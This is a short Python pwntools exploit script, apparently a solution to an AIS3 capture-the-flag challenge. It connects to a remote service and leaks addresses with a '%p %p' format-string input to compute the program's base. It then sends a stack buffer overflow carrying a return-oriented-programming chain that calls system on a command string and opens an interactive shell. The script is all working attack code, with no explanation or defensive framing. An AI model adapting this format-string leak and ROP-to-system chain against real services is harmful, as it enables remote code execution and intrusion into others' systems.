#!/usr/bin/env python
from pwn import *

r = remote('quiz.ais3.org', 4869)
#r = remote('10.0.2.2', 4869)

def echo(say, is_first):
    r.sendafter('Your choice: ', '1')
    if is_first:
        r.sendafter('What do you want to say : ', say)

def bof(payload):
    r.sendafter('Your choice: ', '2')
    r.sendafter('Try your best : ', payload)

echo('%p %p', True)
r.recvuntil('You say : ')
text_base = int(r.recvn(16), 16) - 0x1ceb3 - 0x1400011e5
#buffer_addr = int(r.recvn(17)[1:], 16) + 0x1ca0
print 'text base:', hex(text_base)
#print 'buffer address:', hex(buffer_addr)

pop_rsi_ret = text_base + 0x140001d45
pop_rdi_ret = text_base + 0x140001519
mov_rcx_rdi_call_rsi = text_base + 0x140002648
system = text_base + 0x140004628
cmd = text_base + 0x140014e50

payload = 'A'*32 + p64(pop_rsi_ret) + p64(system) + p64(pop_rdi_ret) + p64(cmd) + p64(mov_rcx_rdi_call_rsi)
bof(payload)

r.interactive()
